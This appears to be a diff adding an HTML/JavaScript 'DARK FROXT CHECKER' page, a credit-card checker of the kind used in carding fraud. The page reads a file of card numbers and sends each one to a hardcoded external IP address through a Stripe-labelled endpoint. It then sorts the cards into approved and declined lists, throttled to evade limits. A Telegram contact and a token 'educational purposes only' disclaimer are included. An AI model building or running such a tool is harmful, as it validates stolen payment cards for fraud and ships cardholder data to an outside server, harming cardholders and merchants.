@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DARK FROXT CHECKER - Upload & Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background: linear-gradient(135deg, #1a202c 0%, #7f1d1d 100%);
+      color: #fff;
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0; min-height: 100vh;
+    }
+    .container { max-width: 950px; margin: 50px auto; padding: 32px; background: rgba(0,0,0,0.4); border-radius: 20px; box-shadow: 0 8px 30px #0008;}
+    h1 { text-align: center; }
+    .uploader { text-align: center; margin-bottom: 22px; }
+    input[type="file"] { margin-top: 8px; color: #fff; }
+    button { background: #2563eb; color: #fff; border: none; border-radius: 8px; padding: 12px 28px; font-size: 1.15rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px;}
+    button:hover { background: #1d4ed8; }
+    .results { display: flex; gap: 32px; justify-content: center; margin-top: 18px; flex-wrap: wrap;}
+    .result-box { flex: 1 1 370px; background: rgba(0,0,0,0.5); border-radius: 12px; padding: 16px 16px 18px 16px; min-height: 250px; box-shadow: 0 2px 14px #0005; border: 2px solid #333; display: flex; flex-direction: column;}
+    .approved { border-color: #10b981; }
+    .declined { border-color: #ef4444; }
+    .result-box h3 { margin-top: 0; text-align: center; letter-spacing: 1px; }
+    .approved-list, .declined-list { font-family: monospace; font-size: 1.06rem; margin: 0; padding-left: 14px; word-break: break-all; flex: 1 1 auto;}
+    .approved-list { color: #10b981;}
+    .declined-list { color: #ef4444;}
+    .loading { color: #fbbf24; text-align: center; margin-top: 12px;}
+    .note { color: #ccc; font-size: 0.95rem; margin-top: 20px; text-align:center;}
+    a { color: #60a5fa; text-decoration: none;}
+    a:hover { color: #f87171; }
+    @media (max-width: 950px) { .results { flex-direction: column; gap: 20px;} }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>DARK FROXT CHECKER</h1>
+    <div class="uploader">
+      <input type="file" id="ccFile" accept=".txt">
+      <button onclick="checkCardsFromFile()">Check Cards</button>
+    </div>
+    <div id="progress" class="loading"></div>
+    <div class="results">
+      <div class="result-box approved">
+        <h3>✅ Approved</h3>
+        <ul id="approvedList" class="approved-list"></ul>
+      </div>
+      <div class="result-box declined">
+        <h3>❌ Declined</h3>
+        <ul id="declinedList" class="declined-list"></ul>
+      </div>
+    </div>
+    <div class="note">
+      <p>Educational purposes only. Not for fraudulent use.</p>
+    </div>
+    <div class="note">
+      <a href="https://t.me/code_wraith" target="_blank">Contact: @Code_Wraith</a>
+    </div>
+  </div>
+  <script>
+    const API_URL = "http://46.202.163.144:9090/v1/stripe/cc=";
+    async function checkCardsFromFile() {
+      const fileInput = document.getElementById("ccFile");
+      const approvedList = document.getElementById("approvedList");
+      const declinedList = document.getElementById("declinedList");
+      const progress = document.getElementById("progress");
+      approvedList.innerHTML = "";
+      declinedList.innerHTML = "";
+      progress.textContent = "";
+
+      if (!fileInput.files[0]) {
+        progress.textContent = "Please select a .txt file.";
+        return;
+      }
+
+      const file = fileInput.files[0];
+      const text = await file.text();
+      const cardLines = text.split('\n').map(x => x.trim()).filter(Boolean);
+
+      if (cardLines.length === 0) {
+        progress.textContent = "No cards found in file.";
+        return;
+      }
+
+      progress.textContent = `Checking ${cardLines.length} card${cardLines.length > 1 ? "s" : ""}...`;
+
+      for (let i = 0; i < cardLines.length; i++) {
+        const card = cardLines[i];
+        progress.textContent = `Checking card ${i+1} of ${cardLines.length}...`;
+        try {
+          const resp = await fetch(API_URL + encodeURIComponent(card));
+          const text = await resp.text();
+
+          // Try to parse JSON, fallback to text
+          let approved = false;
+          let message = text;
+          try {
+            const data = JSON.parse(text);
+            if (
+              (data.status && (data.status.toLowerCase().includes("approved") || data.status.toLowerCase().includes("success"))) ||
+              (data.message && data.message.toLowerCase().includes("approved"))
+            ) {
+              approved = true;
+              message = data.message || "Approved";
+            } else if (
+              (data.status && (data.status.toLowerCase().includes("declined") || data.status.toLowerCase().includes("fail") || data.status.toLowerCase().includes("dead"))) ||
+              (data.message && data.message.toLowerCase().includes("declined"))
+            ) {
+              approved = false;
+              message = data.message || "Declined";
+            } else {
+              approved = false;
+              message = text;
+            }
+          } catch (e) {
+            if (text.toLowerCase().includes("approved") || text.toLowerCase().includes("success")) {
+              approved = true;
+            }
+            if (text.toLowerCase().includes("declined") || text.toLowerCase().includes("dead") || text.toLowerCase().includes("fail")) {
+              approved = false;
+            }
+          }
+          const el = document.createElement("li");
+          el.textContent = card + " → " + message;
+          if (approved) {
+            approvedList.appendChild(el);
+          } else {
+            declinedList.appendChild(el);
+          }
+        } catch (err) {
+          const el = document.createElement("li");
+          el.textContent = card + " → " + "Error: " + err;
+          declinedList.appendChild(el);
+        }
+        await new Promise(res => setTimeout(res, 1000));
+      }
+      progress.textContent = "Done!";
+    }
+  </script>
+</body>
+</html>
